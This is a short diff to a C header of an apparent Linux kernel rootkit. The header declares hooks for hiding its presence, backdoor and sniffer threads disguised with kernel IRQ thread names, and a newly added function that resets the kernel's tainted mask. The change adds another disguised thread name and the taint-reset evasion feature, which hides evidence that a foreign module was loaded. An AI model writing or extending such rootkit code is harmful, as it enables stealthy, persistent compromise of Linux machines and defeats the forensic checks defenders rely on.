@@ -47,6 +47,7 @@
 #define THREAD_PROC_NAME "irq/100_pciehp"
 #define THREAD_SOCK_NAME "irq/101_pciehp"
 #define THREAD_SNIFFER_NAME "irq/102_pciehp"
+#define THREAD_TAINTED_NAME "irq/103_pciehp"
 
 typedef enum {
     CHILDREN,
@@ -113,6 +114,7 @@ struct kernel_syscalls {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     do_exit_sg k_do_exit;
 #endif
+    unsigned long *tainted;
 };
 
 /** hooks, hiding presence and so */
@@ -136,6 +138,9 @@ void kv_scan_and_hide(void);
 
 /** syscall,function addresses */
 struct kernel_syscalls *kv_kall_load_addr(void);
+
+/** resets tainted_mask */
+void kv_reset_tainted(unsigned long *);
 
 /** socket,networking,backdoor management */
 struct task_struct *kv_sock_start_sniff(void);
